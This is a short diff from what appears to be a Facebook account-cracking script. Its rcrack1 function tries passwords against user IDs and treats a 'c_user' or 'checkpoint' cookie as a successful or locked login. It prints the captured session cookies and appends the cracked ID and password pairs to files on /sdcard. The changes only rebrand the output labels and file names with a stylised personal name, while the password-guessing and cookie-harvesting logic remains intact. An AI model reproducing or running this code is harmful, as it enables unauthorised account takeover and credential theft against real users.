@@ -268,22 +268,22 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[MEDIA-OK🔥] {uid} | {ps}")
+                print(f"\033[38;5;46m[𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚-OK✅] {uid} | {ps}")
                 print(f" Cookie : {coki}")
-                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[MEDIA-CP👉] {uid}|{ps}")
-                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\x1b[38;5;196m[𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚-CP💔] {uid}|{ps}")
+                open('/sdcard/𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[MEDIA🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚 🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
